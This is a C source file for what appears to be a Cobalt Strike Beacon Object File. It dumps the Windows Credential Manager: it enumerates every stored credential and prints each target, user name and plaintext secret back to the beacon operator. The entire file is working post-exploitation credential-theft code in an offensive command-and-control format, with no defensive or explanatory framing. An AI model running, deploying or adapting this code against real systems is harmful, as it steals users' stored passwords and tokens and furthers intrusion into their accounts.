#include <windows.h>
#include <stdio.h>
#include <wincred.h>
#include "beacon.h"
#include "bofdefs.h"

void go() {
    DWORD dwCount = 0;
    PCREDENTIALA *pCredentials = NULL;

    if (!ADVAPI32$CredEnumerateA(NULL, 0, &dwCount, &pCredentials)) {
        DWORD dwErr = KERNEL32$GetLastError();
        if (dwErr == ERROR_NOT_FOUND) {
            BeaconPrintf(CALLBACK_OUTPUT, "[CREDMANAGER] No credentials found in Credential Manager\n");
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "[CREDMANAGER] Error enumerating credentials: 0x%lX\n", dwErr);
        }
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[CREDMANAGER] Found %lu credential(s)\n", dwCount);

    for (DWORD i = 0; i < dwCount; i++) {
        BeaconPrintf(CALLBACK_OUTPUT, "[CREDMANAGER] --- Credential [%lu] ---\n", i + 1);

        if (pCredentials[i]->TargetName != NULL) {
            BeaconPrintf(CALLBACK_OUTPUT, "[CREDMANAGER]   Target: %s\n", pCredentials[i]->TargetName);
        }

        if (pCredentials[i]->UserName != NULL) {
            BeaconPrintf(CALLBACK_OUTPUT, "[CREDMANAGER]   User:   %s\n", pCredentials[i]->UserName);
        }

        if (pCredentials[i]->CredentialBlobSize > 0 && pCredentials[i]->CredentialBlob != NULL) {
            BeaconPrintf(CALLBACK_OUTPUT, "[CREDMANAGER]   Secret: %.*s\n",
                pCredentials[i]->CredentialBlobSize,
                (char*)pCredentials[i]->CredentialBlob);
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "[CREDMANAGER]   Secret: <empty or protected>\n");
        }
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[CREDMANAGER] Enumeration complete: %lu credential(s) found\n", dwCount);

    ADVAPI32$CredFree(pCredentials);
}
